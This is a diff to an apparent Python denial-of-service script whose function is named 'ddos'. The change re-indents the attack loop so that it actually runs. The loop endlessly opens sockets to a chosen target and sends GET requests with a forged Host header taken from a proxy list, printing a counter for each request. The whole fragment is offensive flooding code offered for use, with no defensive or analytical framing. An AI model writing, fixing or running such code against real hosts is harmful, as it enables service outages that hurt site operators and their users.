@@ -53,26 +53,26 @@ def ddos(target, proxy_file):
         print(colored("Please re-check your file. It doesn't exist.", 'red'))
         exit(0)
 
-        print(colored('WARNING: Your PC will lag during this attack no matter what Hardware you use (tested).', 'yellow'))
-        while True:
-            for combo in proxies:
-                try:
-                    parts_combo = combo.split(":")
-                    ip = parts_combo[0]
-                    port_own = parts_combo[1]
-                    global attack_count
-                    attack_count += 1
-                    print('')
-                    print(colored('[N] Request Number: '+str(attack_count), 'yellow'))
-                    print(colored('[*] Sending GET Request with '+ip+" on port "+port_own, 'blue'))
-                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    # Connect to target via port
-                    client.connect((str(target), int(port_own)))
-                    # Send GET request to target
-                    client.sendto(("GET / "+str(target)+" HTTP/1.1\r\n").encode('ascii'), (str(target), int(port_own)))
-                    client.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (str(target), int(port_own)))
-                    print(colored('[+] Successfully sent.', 'green'))
-                    client.close()
-                except ConnectionRefusedError:
-                    print(colored('[-] Request was not sent sent.', 'red'))
-                    continue
+    print(colored('WARNING: Your PC will lag during this attack no matter what Hardware you use (tested).', 'yellow'))
+    while True:
+        for combo in proxies:
+            try:
+                parts_combo = combo.split(":")
+                ip = parts_combo[0]
+                port_own = parts_combo[1]
+                global attack_count
+                attack_count += 1
+                print('')
+                print(colored('[N] Request Number: '+str(attack_count), 'yellow'))
+                print(colored('[*] Sending GET Request with '+ip+" on port "+port_own, 'blue'))
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                # Connect to target via port
+                client.connect((str(target), int(port_own)))
+                # Send GET request to target
+                client.sendto(("GET / "+str(target)+" HTTP/1.1\r\n").encode('ascii'), (str(target), int(port_own)))
+                client.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (str(target), int(port_own)))
+                print(colored('[+] Successfully sent.', 'green'))
+                client.close()
+            except ConnectionRefusedError:
+                print(colored('[-] Request was not sent sent.', 'red'))
+                continue
